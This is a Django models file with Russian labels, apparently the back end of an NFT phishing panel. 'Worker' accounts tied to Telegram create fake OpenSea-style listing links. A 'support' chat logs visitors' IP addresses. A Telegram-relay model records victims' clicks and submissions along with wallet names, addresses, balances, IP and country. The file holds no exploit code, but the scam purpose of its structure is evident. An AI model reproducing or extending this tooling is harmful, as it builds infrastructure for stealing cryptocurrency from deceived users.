from django.db import models
from django.contrib.auth.models import BaseUserManager, AbstractBaseUser, PermissionsMixin
from django.urls import reverse
from telegram import Bot
from django.dispatch import receiver
from django.db.models.signals import post_save
import requests


class CustomUserManager(BaseUserManager):

    def create_user(self, email, password=None, id_telegram=None):
        if not email:
            raise ValueError('The Email field must be set')

        user = self.model(email=self.normalize_email(email))
        if id_telegram:
            user.id_telegram = id_telegram

        user.set_password(password)
        user.save(using=self._db)
        return user

    def create_superuser(self, email, password=None, id_telegram=None):
        user = self.create_user(email, password, id_telegram)
        user.is_staff = True
        user.is_superuser = True
        user.save(using=self._db)
        return user


class Worker(AbstractBaseUser, PermissionsMixin):
    email = models.EmailField(max_length=255, unique=True)
    password = models.CharField(max_length=128)
    id_telegram = models.CharField(max_length=100, unique=True, blank=False)

    is_active = models.BooleanField(default=True)
    is_staff = models.BooleanField(default=False)

    objects = CustomUserManager()

    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = []

    def __str__(self):
        return self.email

    class Meta:
        verbose_name = "Воркер"
        verbose_name_plural = "Воркеры"


# Model linkк
class CreateLink(models.Model):
    creator = models.ForeignKey(Worker, verbose_name='Создатель', on_delete=models.CASCADE)
    collection = models.CharField(verbose_name='Коллекция', max_length=1000, blank=True, null=True)

    generate_token = models.AutoField(verbose_name='Генерируемый токен', primary_key=True)
    custom_token = models.CharField(max_length=255, verbose_name='Кастомный токен', blank=True, null=True)

    title = models.CharField(verbose_name='Заголовок', max_length=1000, blank=True, null=True)
    price = models.CharField(verbose_name='Цена', max_length=1000, blank=True, null=True)

    link = models.URLField(verbose_name='Ссылка', max_length=10000, blank=True, null=True)
    image_link = models.URLField(verbose_name='Ссылка на фото', blank=True, null=True)
    qr = models.CharField(verbose_name='QR', max_length=10000, blank=True, null=True)
    worker_id_telegram = models.CharField(verbose_name='id Telegram', max_length=1000, blank=True, null=True)
    slug = models.SlugField(unique=True, max_length=500, verbose_name='URL', blank=True, null=True)
    user_name = models.CharField(max_length=1000, verbose_name="Имя пользователя", blank=True, null=True)
    card_name = models.CharField(max_length=1000, verbose_name="Название карты", blank=True, null=True)
    img_link = models.URLField(verbose_name='Ссылка на фото', max_length=10000, blank=True, null=True)
    card_description = models.CharField(max_length=1000, verbose_name="Описание карты", blank=True, null=True)
    card_about = models.CharField(max_length=1000, verbose_name="Описание коллекции", blank=True, null=True)
    contact_address = models.CharField(max_length=1000, verbose_name="Контакный адрес", blank=True, null=True)
    token_id = models.CharField(max_length=1000, verbose_name="Токен id", blank=True, null=True)
    about_img = models.URLField(verbose_name='Ссылка на фото', max_length=10000, blank=True, null=True)
    exchange = models.CharField(verbose_name="Курс валюты", max_length=1000, blank=True, null=True)

    def __str__(self):
        return f"Ссылка создана воркером --> {self.creator}"
    
    def get_absolute_url(self):
        return reverse('create_link', kwargs={'collection': self.collection})

    class Meta:
        verbose_name = "Ссылка"
        verbose_name_plural = "Ссылки"


# CHAT FOR WORKER AND USER
class Message(models.Model):
    chat = models.ForeignKey('Chat', on_delete=models.CASCADE, related_name='chat_messages')
    sender = models.ForeignKey(Worker, on_delete=models.CASCADE)
    content = models.TextField()
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"Сообщение от {self.sender} в {self.chat}"

    class Meta:
        verbose_name = "Сообщение"
        verbose_name_plural = "Сообщения"


# Technical support
class Chat(models.Model):
    link = models.ForeignKey(CreateLink, related_name='chats', on_delete=models.CASCADE)
    worker = models.ForeignKey(Worker, on_delete=models.CASCADE)
    message = models.TextField()
    is_worker = models.CharField(max_length=100, null=True, blank=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)  # Поле для IP-адреса
    timestamp = models.DateTimeField(auto_now_add=True)

    class Meta:
        verbose_name = "Чат"
        verbose_name_plural = "Чаты"


# REBOUND IN TELEGRAM
class ReboundTelegram(CreateLink):
    STATUS_CHOICES = (
        ('New Message Chat', 'New Message Chat'),
        ('Following a link', 'Переход по ссылке'),
        ('Clicking / Submit', 'Нажатие / Отправить'),
    )
    id_rebound = models.AutoField(primary_key=True)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES)
    platform = models.CharField(max_length=255, default='OpenSea')
    wallet = models.CharField(max_length=255)
    wallet_name = models.CharField(verbose_name='Имя кошелька', max_length=255)
    address = models.CharField(verbose_name='Адрес', max_length=255)
    balance = models.DecimalField(max_digits=20, decimal_places=12)
    ip = models.GenericIPAddressField()
    country = models.CharField(max_length=100)

    def __str__(self):
        return f"{self.id} - {self.creator}"




